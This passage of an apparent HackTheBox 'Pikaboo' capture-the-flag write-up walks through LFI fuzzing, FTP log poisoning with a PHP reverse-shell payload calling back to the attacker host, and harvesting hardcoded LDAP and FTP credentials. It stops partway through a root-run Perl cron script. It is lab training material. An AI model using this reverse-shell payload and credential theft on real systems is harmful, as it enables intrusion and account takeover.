+<h4 id="Fuzzing-For-LFI"><a href="#Fuzzing-For-LFI" class="headerlink" title="Fuzzing For LFI"></a>Fuzzing For LFI</h4><p>I prefer using LFI-Jhaddix.txt for fuzzing as it has cool variations in the payload with the list of potentially useful files.<br>You can download this wordlist from here <span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhbmllbG1pZXNzbGVyL1NlY0xpc3RzL21hc3Rlci9GdXp6aW5nL0xGSS9MRkktSmhhZGRpeC50eHQ=">https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt<i class="fa fa-external-link-alt"></i></span></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Pikaboo$ ffuf -u http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -t 200 -c -fs 15349</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.3.0 Kali Exclusive &lt;3</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 200</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 15349</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/log/lastlog        [Status: 200, Size: 307641, Words: 3272, Lines: 368]</span></span><br><span class="line"><span class="string">/var/log/vsftpd.log     [Status: 200, Size: 19803, Words: 3893, Lines: 414]</span></span><br><span class="line"><span class="string">/var/log/wtmp           [Status: 200, Size: 166983, Words: 3288, Lines: 559]</span></span><br><span class="line"><span class="string">:: Progress: [914/914] :: Job [1/1] :: 314 req/sec :: Duration: [0:00:04] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>
+
+<p>Looks like we have access to logs so if we would have tried to find this LFI manually we wouldn’t be successful until and unless you are genius and remebered that we have FTP also. But let’s be honesh everyone tries &#x2F;etc&#x2F;passwd to check.</p>
+<p>Anyways now we have the FTP log file so the first thing that came to my mind was FTP-log poisoing so if you don’t what that is, it is basically just the injecting PHP code in the FTP log and then later make web server execute that piece of code with the help of LFI.</p>
+<p>If you wanna learn more about it you can refer below articles.</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9zaGFoamVycnkzMy5tZWRpdW0uY29tL3JjZS12aWEtbGZpLWxvZy1wb2lzb25pbmctdGhlLWRlYXRoLXBvdGlvbi1jMDgzMWNlYmMxNmQ=">https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d<i class="fa fa-external-link-alt"></i></span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9zZWNuaGFjay5pbi9mdHAtbG9nLXBvaXNvbmluZy10aHJvdWdoLWxmaS8=">https://secnhack.in/ftp-log-poisoning-through-lfi/<i class="fa fa-external-link-alt"></i></span></p>
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>Looking at the logs we can also find the username but let’s go for LFI.<br>We got the log file </p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2032.jpg"></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s try and get revshell from that.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Pikaboo$ ftp 10.10.10.249</span><br><span class="line">Connected to pikaboo.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (pikaboo.htb:kali): &lt;?php <span class="built_in">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt; /dev/tcp/10.10.14.11/2233 0&gt;&amp;1&#x27;&quot;</span>); ?&gt;</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">530 Login incorrect.</span><br><span class="line">Login failed.</span><br><span class="line">ftp&gt; <span class="built_in">exit</span></span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure>
+
+<p>and the password can be anything and then just start the nc listerner.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Pikaboo$ curl http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log</span><br></pre></td></tr></table></figure>
+
+<p>And Boom we have the reverse shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pikaboo]</span><br><span class="line">└─<span class="comment"># nc -lvp 2233                                                                                                                  </span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::2233</span><br><span class="line">Ncat: Listening on 0.0.0.0:2233</span><br><span class="line">Ncat: Connection from 10.10.10.249.</span><br><span class="line">Ncat: Connection from 10.10.10.249:46682.</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+
+<h1 id="Gaining-User"><a href="#Gaining-User" class="headerlink" title="Gaining User"></a>Gaining User</h1><h2 id="Enumeration-2"><a href="#Enumeration-2" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Let’s check for all the running services on the box</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@pikaboo:/opt/pokeapi$ ss -tupln</span><br><span class="line">Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port                                                                                   </span><br><span class="line">udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        128              0.0.0.0:80            0.0.0.0:*       <span class="built_in">users</span>:((&quot;nginx&quot;,pid=<span class="number">601</span>,fd=<span class="number">6</span>),(&quot;nginx&quot;,pid=<span class="number">600</span>,fd=<span class="number">6</span>))                          </span><br><span class="line">tcp     LISTEN   0        128            127.0.0.1:81            0.0.0.0:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        128            127.0.0.1:389           0.0.0.0:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        128                 [::]:80               [::]:*       <span class="built_in">users</span>:((&quot;nginx&quot;,pid=<span class="number">601</span>,fd=<span class="number">7</span>),(&quot;nginx&quot;,pid=<span class="number">600</span>,fd=<span class="number">7</span>))                          </span><br><span class="line">tcp     LISTEN   0        32                     *:21                  *:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        128                 [::]:22               [::]:*     </span><br></pre></td></tr></table></figure>
+
+<p>Looks like we have LDAP running on the box.<br>Let’s check the home directory for seeing the users&#x2F;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /home</span><br><span class="line">pwnmeow</span><br></pre></td></tr></table></figure>
+
+<p>Looks like we have only one user.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /home/pwnmeow</span><br><span class="line">total 580</span><br><span class="line">drwxr-xr-x 2 pwnmeow pwnmeow  569344 Jul  6 20:02 .</span><br><span class="line">drwxr-xr-x 3 root    root       4096 May 10 10:26 ..</span><br><span class="line">lrwxrwxrwx 1 root    root          9 Jul  6 20:02 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 pwnmeow pwnmeow     220 May 10 10:26 .bash_logout</span><br><span class="line">-rw-r--r-- 1 pwnmeow pwnmeow    3526 May 10 10:26 .bashrc</span><br><span class="line">-rw-r--r-- 1 pwnmeow pwnmeow     807 May 10 10:26 .profile</span><br><span class="line">lrwxrwxrwx 1 root    root          9 Jul  6 20:01 .python_history -&gt; /dev/null</span><br><span class="line">-r--r----- 1 pwnmeow www-data     33 Jul 17 22:06 user.txt</span><br></pre></td></tr></table></figure>
+
+<p>An unusual .python_history file is there so let’s check it out.<br>Looking for intresting things I checked &#x2F;opt directory.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /opt</span><br><span class="line">pokeapi</span><br></pre></td></tr></table></figure>
+
+<p>We found the under construction version of pokeapi so there could be exploit but we can’t exploit it but what we can do is to find hardcoded creds in it as developers might have left it as it is still not implemented.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/pokeapi</span><br><span class="line">www-data@pikaboo:/opt/pokeapi$ <span class="built_in">ls</span></span><br><span class="line">CODE_OF_CONDUCT.md  README.md         data                pokemon_v2</span><br><span class="line">CONTRIBUTING.md     Resources         docker-compose.yml  requirements.txt</span><br><span class="line">CONTRIBUTORS.txt    __init__.py       graphql             test-requirements.txt</span><br><span class="line">LICENSE.md          apollo.config.js  gunicorn.py.ini</span><br><span class="line">Makefile            config            manage.py</span><br></pre></td></tr></table></figure>
+
+<p>Let’s just try and grep for passwords from the files.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@pikaboo:/opt/pokeapi$ grep -iRl <span class="string">&#x27;password&#x27;</span></span><br><span class="line">.github/workflows/docker-image.yml</span><br><span class="line">Resources/compose/docker-compose-prod-graphql.yml</span><br><span class="line">Resources/docker/app/README.md</span><br><span class="line">docker-compose.yml</span><br><span class="line">config/docker.py</span><br><span class="line">config/settings.py</span><br><span class="line">config/docker-compose.py</span><br></pre></td></tr></table></figure>
+
+<p>We have some files which has the word password in it the most intresting file is config&#x2F;settings.py so let’s see that.<br>Checking that file out you can see this good part.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;                                                                                                                                                         </span><br><span class="line">    <span class="string">&quot;ldap&quot;</span>: &#123;                                                                                                                                                         </span><br><span class="line">        <span class="string">&quot;ENGINE&quot;</span>: <span class="string">&quot;ldapdb.backends.ldap&quot;</span>,                                                                                                                             </span><br><span class="line">        <span class="string">&quot;NAME&quot;</span>: <span class="string">&quot;ldap:///&quot;</span>,                                                                                                                                           </span><br><span class="line">        <span class="string">&quot;USER&quot;</span>: <span class="string">&quot;cn=binduser,ou=users,dc=pikaboo,dc=htb&quot;</span>,                                                                                                             </span><br><span class="line">        <span class="string">&quot;PASSWORD&quot;</span>: <span class="string">&quot;J~42%W?PFHl]g&quot;</span>,                                                                                                                                  </span><br><span class="line">    &#125;,                                                                                                                                                                </span><br><span class="line">    <span class="string">&quot;default&quot;</span>: &#123;                                                                                                                                                      </span><br><span class="line">        <span class="string">&quot;ENGINE&quot;</span>: <span class="string">&quot;django.db.backends.sqlite3&quot;</span>,                                                                                                                       </span><br><span class="line">        <span class="string">&quot;NAME&quot;</span>: <span class="string">&quot;/opt/pokeapi/db.sqlite3&quot;</span>,                                                                                                                            </span><br><span class="line">    &#125;                                                                                                                                                                 </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>we can see LDAP creds and we know the ldap is running so let’s try to enumerate it with creds we found.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">www-data@pikaboo:/opt/pokeapi$ ldapsearch -D <span class="string">&quot;cn=binduser,ou=users,dc=pikaboo,dc=htb&quot;</span> -w <span class="string">&#x27;J~42%W?PFHl]g&#x27;</span> -b <span class="string">&#x27;dc=pikaboo,dc=htb&#x27;</span> -LLL -h 127.0.0.1 -p 389 -s sub <span class="string">&quot;(objectClass=*)&quot;</span></span><br><span class="line">&lt;--SNIP--&gt;</span><br><span class="line">dn: uid=pwnmeow,ou=<span class="built_in">users</span>,dc=ftp,dc=pikaboo,dc=htb</span><br><span class="line">objectClass: inetOrgPerson</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">uid: pwnmeow</span><br><span class="line">cn: Pwn</span><br><span class="line">sn: Meow</span><br><span class="line">loginShell: /bin/bash</span><br><span class="line">uidNumber: 10000</span><br><span class="line">gidNumber: 10000</span><br><span class="line">homeDirectory: /home/pwnmeow</span><br><span class="line">userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==</span><br><span class="line">&lt;--SNIP--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Looking at the LDAP dump we can see the creds for the user pwnmeow.<br>so let’s base64 decode that creds.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Pikaboo$ <span class="built_in">echo</span> <span class="string">&quot;X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">_G0tT4_C4tcH_<span class="string">&#x27;3m_4lL!_</span></span><br></pre></td></tr></table></figure>
+
+<p>We have the password for the user pwnmeow but the catch over here is that we cannot su into pwnmeow with that creds neither you can use it to SSH.</p>
+<p>So from beginning we know that FTP also has the user pwnmeow from the logs that we saw from local file inclusion so let’s try this cred there.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Pikaboo$ ftp 10.10.10.249</span><br><span class="line">Connected to pikaboo.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (pikaboo.htb:kali): pwnmeow</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>
+
+<p>And boom it worked so let’s enumerate futher.</p>
+<h1 id="PrivESC-TO-Root"><a href="#PrivESC-TO-Root" class="headerlink" title="PrivESC TO Root"></a>PrivESC TO Root</h1><h2 id="Enumeration-3"><a href="#Enumeration-3" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>let’s see if there is any cron running.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">www-data@pikaboo:/opt/pokeapi$ <span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br><span class="line">17 *    * * *   root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">* * * * * root /usr/local/bin/csvupdate_cron</span><br></pre></td></tr></table></figure>
+
+<p>Looks like we have a script that is been executed as root every single second.<br>so let’s look into script.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@pikaboo:/opt/pokeapi$ <span class="built_in">cat</span> /usr/local/bin/csvupdate_cron</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> /srv/ftp/*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">cd</span> <span class="variable">$d</span></span><br><span class="line">  /usr/local/bin/csvupdate $(<span class="built_in">basename</span> <span class="variable">$d</span>) *csv</span><br><span class="line">  /usr/bin/rm -rf *</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>looks like it is just a simple bash script to run another script &#x2F;usr&#x2F;local&#x2F;bin&#x2F;csvupdate with the filename as the parameter for the files in FTP and now as we have access to FTP we might be able to exploit it.</p>
+<p>so let’s look at the &#x2F;usr&#x2F;local&#x2F;bin&#x2F;csvupdate file.</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Script for upgrading PokeAPI CSV files with FTP-uploaded data. #</span></span><br><span class="line"><span class="comment">#                                                                #</span></span><br><span class="line"><span class="comment"># Usage:                                                         #</span></span><br><span class="line"><span class="comment"># ./csvupdate &lt;type&gt; &lt;file(s)&gt;                                   #</span></span><br><span class="line"><span class="comment">#                                                                #</span></span><br><span class="line"><span class="comment"># Arguments:                                                     #</span></span><br><span class="line"><span class="comment"># - type: PokeAPI CSV file type                                  #</span></span><br><span class="line"><span class="comment">#         (must have the correct number of fields)               #</span></span><br><span class="line"><span class="comment"># - file(s): list of files containing CSV data                   #</span></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> Text::CSV;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $csv_dir = <span class="string">&quot;/opt/pokeapi/data/v2/csv&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> %csv_fields = (</span><br><span class="line">  <span class="string">&#x27;abilities&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;ability_changelog&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;ability_changelog_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;ability_flavor_text&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;ability_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;ability_prose&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;berries&#x27;</span> =&gt; <span class="number">10</span>,</span><br><span class="line">  <span class="string">&#x27;berry_firmness&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;berry_firmness_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;berry_flavors&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span 